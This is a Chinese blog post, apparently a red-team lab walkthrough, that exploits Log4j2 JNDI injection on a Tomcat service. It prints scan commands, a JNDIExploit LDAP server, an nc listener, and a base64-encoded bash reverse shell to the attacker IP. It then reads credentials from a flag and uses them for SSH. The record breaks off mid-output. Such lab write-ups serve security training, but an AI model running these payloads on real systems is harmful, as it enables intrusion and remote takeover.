@@ -1,0 +1,1674 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="渗透攻击红队靶场二（1）, wuk0Ng">
+    <meta name="description" content="wuk0Ng的个人博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>渗透攻击红队靶场二（1） | wuk0Ng</title>
+    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
+
+    <link rel="dns-prefetch" href="//hm.baidu.com">
+    <link rel="dns-prefetch" href="//zz.bdstatic.com">
+    <link rel="dns-prefetch" href="//busuanzi.ibruce.info">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css?v=20260824-speed1">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css?v=20260824-2">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+   
+<style>
+    body{
+       background-image: url(/medias/my_background.webp);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wuk0Ng</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wuk0Ng</div>
+        <div class="logo-desc">
+            
+            wuk0Ng的个人博客
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.webp')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">渗透攻击红队靶场二（1）</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                <span class="chip bg-color">红队</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-10-16
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h1><p>参考下大佬博客，<a target="_blank" rel="noopener" href="https://colind0pe.top/">https://colind0pe.top/</a></p>
+<p>渗透攻击红队靶场二考察点总结<br>最终flag在域控的C盘根目录</p>
+<p>一、漏洞挖掘与利用<br>Log4j2漏洞（JNDI注入）验证方法<br>Log4j2-RCE漏洞利用与反弹shell获取<br>永恒之蓝（MS17-010）漏洞实战应用<br>域控相关漏洞（CVE-2021-42287、CVE-2021-42278）利用与横向移动<br>二、渗透工具操作<br>JNDIExploit工具部署与LDAP&#x2F;HTTP服务开启<br>nc工具端口监听与反弹shell接收<br>Metasploit Framework（msf）模块使用（主机上线、hash dump等）<br>Python渗透脚本（如sam_the_admin.py）执行与域控攻击<br>Docker容器相关命令操作与环境验证<br>三、Payload构造与编码处理<br>反弹shell命令（bash一句话）编写<br>Base64编码对payload进行处理<br>URL编码解决特殊字符导致的payload失效问题<br>JNDI注入型payload构造（LDAP协议调用格式）<br>四、容器安全与逃逸测试<br>Docker容器环境识别方法（文件验证、进程组查看）<br>runC漏洞逃逸技术尝试与版本兼容性判断<br>容器特权模式（privileged）检测与逃逸测试<br>容器内权限分析与提权思路<br>五、内网渗透核心操作<br>内网路由配置与主机发现<br>内网端口扫描与目标信息收集<br>跨主机权限拓展与横向移动策略<br>哈希值获取（hash dump）操作<br>SSH协议远程连接与凭证利用<br>六、权限维持与痕迹清理<br>系统日志清理命令（clearev）使用<br>多类型事件日志（应用程序、安全、系统等）批量清理<br>渗透痕迹掩盖思路与操作<br>七、渗透流程与思路<br>完整渗透流程：信息收集→漏洞挖掘→漏洞利用→提权→内网渗透→横向移动→权限维持→痕迹清理<br>靶场flag查找与凭证提取思路<br>多场景下的权限转换与拓展策略</p>
+<p>渗透攻击红队内网域渗透靶场 拓扑结构</p>
+<p>攻击端</p>
+<ul>
+<li>操作角色：渗透攻击红队人员</li>
+<li>攻击设备：<ul>
+<li>Windows 10 个人PC</li>
+<li>Kali Linux VPS</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>网络区域拓扑</p>
+<p>DMZ区域</p>
+<ul>
+<li>边界设备：防火墙</li>
+<li>核心服务器：Ubuntu-16 服务器<ul>
+<li>外网IP：<code>192.168.0.x</code>（DHCP分配，桥接模式）</li>
+<li>内网IP：<code>10.0.1.6</code>（仅主机模式）</li>
+<li>运行环境：Ubuntu Desktop + Log4j2 环境</li>
+</ul>
+</li>
+<li>链路：攻击端 → DMZ区域</li>
+</ul>
+<p>个人办公区</p>
+<ul>
+<li>终端设备：Windows 7<ul>
+<li>内网IP 1：<code>10.0.1.7</code>（仅主机模式，连通DMZ区）</li>
+<li>内网IP 2：<code>10.0.0.7</code>（仅主机模式，连通域核心区）</li>
+</ul>
+</li>
+<li>链路：DMZ区域 → 个人办公区</li>
+</ul>
+<p>域核心机器</p>
+<ul>
+<li>域控制器：Windows 2012<ul>
+<li>内网IP：<code>10.0.0.12</code>（仅主机模式）</li>
+</ul>
+</li>
+<li>通关目标：域控桌面存放 Flag 文件，成功获取即可通关</li>
+<li>链路：个人办公区 → 域核心机器</li>
+</ul>
+<p>大概的拓扑结构如上，具体IP可能不准确</p>
+<p>给了地址<br>目标地址<br>192.168.111.20<br>本机地址<br>192.168.111.25</p>
+<p>我们先来测试是否成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt;ping 192.168.111.20 -n 3</span><br><span class="line"></span><br><span class="line">正在 Ping 192.168.111.20 具有 32 字节的数据:</span><br><span class="line">来自 192.168.111.20 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.111.20 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.111.20 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line">192.168.111.20 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 3，已接收 = 3，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 0ms，最长 = 0ms，平均 = 0ms</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里可以看到和目的地址的通信是成功的了</p>
+<h1 id="美美开始攻击"><a href="#美美开始攻击" class="headerlink" title="美美开始攻击"></a>美美开始攻击</h1><p>“我能拿下整个域控，却拿不下她的心”–wuk0Ng</p>
+<p>开始扫描端口（直接访问那个网站会发现访问不了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.111.20</span><br></pre></td></tr></table></figure>
+<p>我是用这个nmap的win桌面版,要是有时间可以稍微记下nmap每个命令对应着什么啥的（之前面试看到有考的）</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/ScreenShot_2026-10-14_183909_396.png?raw=true"></p>
+<p>可以看到22和38080端口是有对应的服务的</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/ScreenShot_2026-10-14_184449_112.png?raw=true"></p>
+<p>22的访问不了，但是这个38080可以很明显的看出来是java写的</p>
+<p>还有nmap的扫描结果可以看到是38080&#x2F;tcp open  http    Apache Tomcat的这么一个服务</p>
+<p>本题目是打Log4j2 rce<br>好了，我们这里再留下问题：后面补一下这个就是tomcat和spring boot页面，一看到应该怎么打，再延申到比如有log4j2这些<br>这是第二个待解决的问题</p>
+<p>我最近打的时候发现我之前最常用的dnslog平台用不了了，我就先用个bp上的吧<img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/ScreenShot_2026-10-14_190252_750.png?raw=true"></p>
+<p>然后数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.111.20:38080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我打着打着发现为啥我访问不了dnslog了，好像是clash的这个tun和系统代理都开的话（我记得之前我是关了系统代理的）就会出现这个http的服务访问出现一些问题</p>
+<p>那我肯定还是用dnslog方便很多</p>
+<p>但是奥，我反复尝试过了，应该是靶机不出网的问题，带不出dnslog</p>
+<p>但是好像这个应该还是能和我的电脑通信吧，我的bp应该有记录呀<br>但是我哪里有问题，没找到，dnslog和bp试了挺多次没有成功</p>
+<p>扫描，可以用kali里面内嵌的一个扫描器，不用dirsearch是因为我在win上的dirsearch扫不出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirb http://192.168.111.20:38080/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Oct 15 18:04:41 2026</span><br><span class="line">URL_BASE: http://192.168.111.20:38080/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.111.20:38080/ ----</span><br><span class="line">+ http://192.168.111.20:38080/error (CODE:500|SIZE:105)                                  </span><br><span class="line">+ http://192.168.111.20:38080/favicon.ico (CODE:200|SIZE:946)                            </span><br><span class="line">+ http://192.168.111.20:38080/hello (CODE:405|SIZE:149)                                  </span><br><span class="line">                                                                                         </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Oct 15 18:09:01 2026</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 3</span><br></pre></td></tr></table></figure>
+<p><strong>405 状态码的含义</strong><br><code>CODE:405</code> 对应的是 HTTP 标准状态码 <strong>405 Method Not Allowed</strong>，直译是 “请求方法不被允许”。<br>它的完整语义是：<strong>该路径真实存在，但服务器拒绝了当前使用的 GET 方法，只允许使用其他指定的 HTTP 方法</strong></p>
+<p>我再试试kali上的这个dirsearch</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.111.20:38080</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirsearch -u http://192.168.111.20:38080</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25</span><br><span class="line">Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/reports/http_192.168.111.20_38080/_26-10-15_18-10-25.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.111.20:38080/</span><br><span class="line"></span><br><span class="line">[18:10:25] Starting: </span><br><span class="line">[18:10:32] 400 -  800B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           </span><br><span class="line">[18:10:32] 400 -  800B  - /a%5c.aspx                                        </span><br><span class="line">[18:10:48] 500 -  105B  - /error                                            </span><br><span class="line">[18:10:49] 500 -  105B  - /error/                                           </span><br><span class="line">[18:10:49] 200 -  946B  - /favicon.ico                                      </span><br><span class="line">[18:10:52] 405 -  149B  - /hello   </span><br></pre></td></tr></table></figure>
+<p>扫出来了<br>然后具体的参数只能尝试爆破了</p>
+<p>然后开始打，使用 JNDIExploit 工具启动 LDAP 服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/JNDIExploit</span><br><span class="line">java -jar target/JNDIExploit-1.0-SNAPSHOT.jar -i 192.168.111.25</span><br></pre></td></tr></table></figure>
+<p>在攻击机上开启 netcat 监听，等待反弹 shell 连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 12999</span><br></pre></td></tr></table></figure>
+<p>再开一个终端,构造反弹 Shell Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">原始反弹 Shell 命令</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.111.25/129990&gt;&amp;1</span><br><span class="line">Base64 编码</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4yNS8xMjk5OSAwPiYx</span><br><span class="line">URL 编码（编码 + 号）</span><br><span class="line">YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjExMS4yNS8xMjk5OSAwPiYx</span><br><span class="line"></span><br><span class="line">这样编码的原因是因为我们先尝试第一个会发现不行，然后我们得尝试编码</span><br><span class="line">或者不用下面得curl，直接用BP发包也是可以的</span><br><span class="line"></span><br><span class="line">curl http://192.168.111.20:38080/hello -X POST -d &#x27;payload=$&#123;jndi:ldap://192.168.111.25:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjExMS4yNS8xMjk5OSAwPiYx&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里之前需要完成这个比如叫9027这个ovpn的配置文件，比如我拖到kali桌面（我是这个时候把win的关掉了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --config /root/Desktop/9027.ovpn</span><br></pre></td></tr></table></figure>
+<p>然后就这样连接可以了</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/ScreenShot_2026-10-15_195422_401.png?raw=true"></p>
+<p>可以看到已经拿下了</p>
+<p>我们cd进入根目录，然后ls -la<br>发现文件<code>.dockerenv</code><br>可以知道现在的环境是这个docker里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@f541fdc81032:~# ls</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@f541fdc81032:~# cat /falg.txt</span><br><span class="line">cat /falg.txt</span><br><span class="line">cat: /falg.txt: No such file or directory</span><br><span class="line">root@f541fdc81032:~# cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">flag&#123;redteam.lab-1&#125;</span><br><span class="line"></span><br><span class="line">Congratulations, you got this : saul  Saul123</span><br><span class="line">root@f541fdc81032:~# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>找到一个账号密码，我们去尝试ssh登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh saul@192.168.111.20</span><br><span class="line">Saul123</span><br></pre></td></tr></table></figure>
+
+<p>连接上之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">saul@ubantu:~$ ifconfig</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet6 fe80::42:7ff:fef3:d2c8  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 02:42:07:f3:d2:c8  txqueuelen 0  (以太网)</span><br><span class="line">        RX packets 38608  bytes 6587136 (6.5 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 40364  bytes 7624819 (7.6 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.111.20  